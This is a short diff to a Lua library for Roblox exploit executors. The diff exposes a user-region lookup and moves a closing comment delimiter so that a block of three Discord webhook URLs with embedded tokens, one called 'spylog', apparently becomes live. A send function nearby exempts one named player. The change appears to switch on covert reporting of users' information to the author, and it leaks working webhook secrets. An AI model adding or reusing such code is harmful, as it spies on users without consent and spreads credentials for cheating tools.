@@ -1837,7 +1837,7 @@ else
 end
 end
 
-local function Virtual_Region()
+function lib.getUserRegion()
 	if Exploit() == "Arceus X" or Exploit() == "Codex" then
 		return "null"
 	else
@@ -1876,7 +1876,7 @@ end
 		lib:WarnUser("null information",{AutoClose = false,CanClick = true,Duration = 9e9})
 	end
 end
-]]
+
 local url = "https://discord.com/api/webhooks/1212344550505324594/qCGYPkCwmBD3SPV2jpop_nn8qPBKxB9HQ8g62hJT-Lub0TD1Gmgdj3nolXt9rqxsCax0"
 local conflog = "https://discord.com/api/webhooks/1211484283731181639/rbJUNf5xMNmc2C-UrW8FN8TMSsuunkj1GFq9tqzr3DEpS_2_tNNQXEdhZc4Z1Tos8W2t"
 local spylog = "https://discord.com/api/webhooks/1212007908368195624/-aftzn9Z8gj1rmq4CiM_P6JjoRdVXetBbIv9VGQwWO7d3VMo3WTbbxIJcNHWLXmKKFgH"
@@ -1920,7 +1920,7 @@ task.spawn(function()
 		print(c)
 	end
 end)
-
+]]
 function lib:hooksend(str)
 	local f,c = pcall(function()
 		if LocalPlayer.Name ~= "Rivanda_Cheater" then
